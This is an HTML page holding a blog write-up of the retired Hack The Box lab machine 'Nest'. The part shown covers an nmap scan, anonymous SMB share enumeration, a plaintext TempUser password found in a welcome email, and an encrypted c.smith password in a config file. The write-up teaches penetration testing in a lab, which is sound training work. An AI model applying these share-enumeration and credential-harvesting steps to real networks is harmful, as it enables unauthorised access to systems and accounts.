<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="This machine is currently active on hackthebox wait until it gets retired or if you have owned it then you need to get the Administrator NTLM hash or the root password hash from the file /etc/shadow file.And enjoy the writeup." /><meta property="og:title" content="Hackthebox Nest writeup" /><meta property="og:description" content="This machine is currently active on hackthebox wait until it gets retired or if you have owned it then you need to get the Administrator NTLM hash or the root password hash from the file /etc/shadow file.And enjoy the writeup." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/nest/nest.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Nest writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="This machine is currently active on hackthebox wait until it gets retired or if you have owned it then you need to get the Administrator NTLM hash or the root password hash from the file /etc/shadow file.And enjoy the writeup."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/nest/nest.png"><title>Hackthebox Nest writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Nest writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Nest writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Feb 21, 2020, 12:00 AM +0800" > Feb 21 <i class="unloaded">2020-02-21T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/nest/nest.png" class="post-preview-img"><h1 id="information">information</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Nest<tr><td>IP<td>10.10.10.178<tr><td>Points<td>20<tr><td>Os<td>Windows<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/158833" target="_blank">VbScrub</a><tr><td>Out On<td>25 Jan 2020<tr><td>Retired on<td>6 June 2020</table></div><h1 id="briefnest">Brief@Nest:~$</h1><p>The journey begins with some <code class="language-plaintext highlighter-rouge">shares</code> where <strong>anonymous</strong> login is allowed , We got <code class="language-plaintext highlighter-rouge">Tempuser</code> <strong>password</strong> from that share . And now i got a <code class="language-plaintext highlighter-rouge">hash</code> which seems to be <strong>uncrackable</strong> , And a <strong>utils.vb</strong> that contains the <code class="language-plaintext highlighter-rouge">code</code> to decrypt it . From share <strong>User</strong> got <code class="language-plaintext highlighter-rouge">debug mode password</code> . Running some query on port <strong>4386</strong>. I got another hash and a <code class="language-plaintext highlighter-rouge">.exe</code> file also . <strong>Reversing</strong> or <strong>Debugging</strong> the file we got the essential things to decrypt the <code class="language-plaintext highlighter-rouge">hash</code> using the script that we used to decrypt the <code class="language-plaintext highlighter-rouge">first</code> <strong>hash</strong> . Getting Root shell using <code class="language-plaintext highlighter-rouge">psexec</code> from <strong>impacket</strong>.</p><h1 id="summary">Summary</h1><ul><li>Anonymous login in smb service using smbclient<li>Got TempUser passowrd and loggin in as TempUser<li>Descrypting the c.smith hash using the script got from RU_Scanner<li>Got Debug-mode-password and using it on high port to read files<li>Decompiling the exe binary using Dotpeek and getting the code to decrypt the hash<li>Root.txt</ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/nest/nest.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="nmap">Nmap</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre><td class="rouge-code"><pre>➜  nest nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-oA</span> scans/nmap.full nest.htb
<span class="c"># Nmap 7.80 scan initiated Fri Jun  5 13:31:35 2020 as: nmap -sV -sC -T4 -p- -v -oA scans/nmap.full nest.htb</span>
Nmap scan report <span class="k">for </span>nest.htb <span class="o">(</span>10.10.10.178<span class="o">)</span>
Host is up <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised <span class="nb">command</span>
|   Help: 
|     Reporting Service V1.2
|     This service allows <span class="nb">users </span>to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS <span class="nt">---</span>
|     LIST
|     SETDIR &lt;Directory_Name&gt;
|     RUNQUERY &lt;Query_ID&gt;
|     DEBUG &lt;Password&gt;
|_    HELP &lt;Command&gt;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/5%Time<span class="o">=</span>5EDA83AC%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
SF:L,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>GenericLine
SF:s,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised
SF:</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20
SF:V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">
SF:HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20comman
SF:d</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n</span><span class="s2">
SF:</span><span class="se">\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Repor
SF:ting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\</span><span class="s2">
SF:x20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,21,<span class="s2">"</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>Help,F2,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">
SF:20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">This</span><span class="se">\x</span><span class="s2">20service</span><span class="se">\x</span><span class="s2">20allows</span><span class="se">\x</span><span class="s2">
SF:20users</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20run</span><span class="se">\x</span><span class="s2">20queries</span><span class="se">\x</span><span class="s2">20against</span><span class="se">\x</span><span class="s2">20databases</span><span class="se">\x</span><span class="s2">20using</span><span class="se">\x</span><span class="s2">20the
SF:</span><span class="se">\x</span><span class="s2">20legacy</span><span class="se">\x</span><span class="s2">20HQK</span><span class="se">\x</span><span class="s2">20format</span><span class="se">\r\n\r\n</span><span class="s2">---</span><span class="se">\x</span><span class="s2">20AVAILABLE</span><span class="se">\x</span><span class="s2">20COMMANDS</span><span class="se">\x</span><span class="s2">20---</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n\r\n</span><span class="s2">LIST</span><span class="se">\r\n</span><span class="s2">SETDIR</span><span class="se">\x</span><span class="s2">20&lt;Directory_Name&gt;</span><span class="se">\r\n</span><span class="s2">RUNQUERY</span><span class="se">\x</span><span class="s2">20&lt;Query_ID&gt;</span><span class="se">\r\n</span><span class="s2">
SF:DEBUG</span><span class="se">\x</span><span class="s2">20&lt;Password&gt;</span><span class="se">\r\n</span><span class="s2">HELP</span><span class="se">\x</span><span class="s2">20&lt;Command&gt;</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,21,<span class="s2">"</span><span class="se">\r\</span><span class="s2">
SF:nHQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie
SF:,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>TLSSessionRe
SF:q,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,21
SF:,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,21,<span class="s2">"
SF:</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">
SF:HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,3A,
SF:<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20c
SF:ommand</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>LPDString,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>LDAPSearchReq,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2
SF:</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\</span><span class="s2">
SF:n</span><span class="se">\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>LANDesk-RC,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Re
SF:porting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServer,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20
SF:Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span><span class="p">;</span>

Host script results:
|_clock-skew: <span class="nt">-7h24m15s</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2020-06-05T10:19:29
|_  start_date: 2020-06-05T05:43:12

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Fri Jun  5 13:44:23 2020 -- 1 IP address (1 host up) scanned in 767.98 seconds</span>
</pre></table></code></div></div><p>Lets enumerate the port 445 using SMBCLIENT , I just list the all available share on the machine</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>┌─[prashant@parrot]─[/home/prashant/Desktop/everything_is_here/hackthebox/machines/nest]
└──╼ <span class="nv">$smbclient</span> <span class="nt">-L</span> nest.htb
Enter WORKGROUP<span class="se">\r</span>oots password: 

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	Data            Disk      
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	Secure<span class="nv">$ </span>        Disk      
	Users           Disk      
SMB1 disabled <span class="nt">--</span> no workgroup available
</pre></table></code></div></div><p>Lets try to access the share and to check if we are allowed to access any share without any username or password</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>┌─[prashant@parrot]─[/home/prashant/Desktop/everything_is_here/hackthebox/machines/nest]
└──╼ <span class="nv">$ </span>smbclient  //nest.htb/Data
Enter WORKGROUP<span class="se">\r</span>oots password: 
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

		10485247 blocks of size 4096. 6449690 blocks available
smb: <span class="se">\&gt;</span> 
</pre></table></code></div></div><p>Yes we can…..</p><p>After enumerating the Data share I got a File called Welcome email.txt</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>smb: <span class="se">\S</span>hared<span class="se">\T</span>emplates<span class="se">\H</span>R<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Aug  7 15:08:01 2019
  ..                                  D        0  Wed Aug  7 15:08:01 2019
  Welcome Email.txt                   A      425  Wed Aug  7 18:55:36 2019

		10485247 blocks of size 4096. 6449690 blocks available
</pre></table></code></div></div><p>The file contains Creds of user Tempuser</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;

You will find your home folder in the following location: 
\\HTB-NEST\Users\&lt;USERNAME&gt;

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
</pre></table></code></div></div><p>So we can now login as user TempUser using Smbclient</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌─[✗]─[prashant@parrot]─[/home/prashant/Desktop/everything_is_here/hackthebox/machines/nest]
└──╼ <span class="nv">$smbclient</span>  //nest.htb/Data <span class="nt">-U</span> TempUser
Enter WORKGROUP<span class="se">\T</span>empUser<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; 
</span></pre></table></code></div></div><p>Spending some more time on the share i found a RU_config.xml in the RUscanner dir</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>smb: <span class="se">\I</span>T<span class="se">\C</span>Onfigs<span class="se">\R</span>U Scanner<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Aug  7 16:01:13 2019
  ..                                  D        0  Wed Aug  7 16:01:13 2019
  RU_config.xml                       A      270  Thu Aug  8 15:49:37 2019

		10485247 blocks of size 4096. 6449639 blocks available
</pre></table></code></div></div><p>The file contains User C.smith Hashed password</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="nt">&lt;ConfigFile</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;Port&gt;</span>389<span class="nt">&lt;/Port&gt;</span>
  <span class="nt">&lt;Username&gt;</span>c.smith<span class="nt">&lt;/Username&gt;</span>
  <span class="nt">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class="nt">&lt;/Password&gt;</span>
<span class="nt">&lt;/ConfigFile&gt;</span>
</pre></table></code></div></div><p>So the hash need to be decrypt,and i didn’t find any online way or any tool to decrypt it.</p><p>And i got one more file called config.xml of Notepad++</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>smb: <span class="se">\I</span>T<span class="se">\C</span>Onfigs<span class="se">\N</span>otepadPlusPlus<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Aug  7 15:31:37 2019
  ..                                  D        0  Wed Aug  7 15:31:37 2019
  config.xml                          A     6451  Wed Aug  7 19:01:25 2019
  shortcuts.xml                       A     2108  Wed Aug  7 15:30:27 2019

		10485247 blocks of size 4096. 6449952 blocks available
